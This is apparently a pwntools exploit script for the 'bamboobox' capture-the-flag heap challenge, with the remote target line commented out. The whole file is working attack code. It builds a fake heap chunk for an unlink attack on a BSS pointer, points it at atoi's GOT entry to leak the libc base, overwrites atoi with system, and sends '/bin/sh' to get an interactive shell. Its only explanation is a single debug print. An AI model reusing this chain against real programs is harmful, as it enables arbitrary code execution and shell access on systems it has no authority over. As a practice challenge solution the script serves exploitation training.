from pwn import *
context(log_level='debug',arch='amd64',os='linux',terminal=['tmux','splitw','-h'])



io=process("./bamboobox")
# io=remote("node4.buuoj.cn",27423)
elf=ELF("./bamboobox")
libc=ELF("./libc-2.23.so")
one_gadget=[0x45216, 0x4526a, 0xf03a4, 0xf1247]
bss_addr=0x6020C8
# pf_got=elf.got[b"printf"]
atoi_got=elf.got[b"atoi"]
free_got=elf.got[b"free"]

def show():
    io.sendlineafter("Your choice:",b"1")

def add(n,c):
    io.sendlineafter("Your choice:",b"2")
    io.sendlineafter("name:",str(n))
    io.sendafter("item:",c)

def edit(n,c,cc):
    io.sendlineafter("Your choice:",b"3")
    io.sendlineafter("item:",str(n))
    io.sendafter("name:",str(c))
    io.sendafter("item:",cc)

def delete(n):
    io.sendlineafter("Your choice:",b"4")
    io.sendlineafter("item:",str(n))

add(0x30,b"aaa") 
add(0x80,b"qqq")
add(0x40,b"www")

payload=p64(0)+p64(0x30)
fd=bss_addr-0x18
bk=bss_addr-0x10
payload+=p64(fd)+p64(bk)
payload+=cyclic(0x10)
payload+=p64(0x30)+p64(0x90)



edit(0,len(payload),payload)

delete(1)


payload=p64(0)*2+p64(0)+p64(atoi_got)
edit(0,len(payload),payload)
gdb.attach(io)
pause()
show()
io.recvuntil("0 : ")
libc_base=u64(io.recv(6).ljust(8,b"\x00"))-libc.sym[b"atoi"]
print("libc_base:  "+hex(libc_base))


sys_addr=libc_base+libc.sym[b"system"]
edit(0,8,p64(sys_addr))
io.sendafter("choice:",b"/bin/sh\x00")


io.interactive()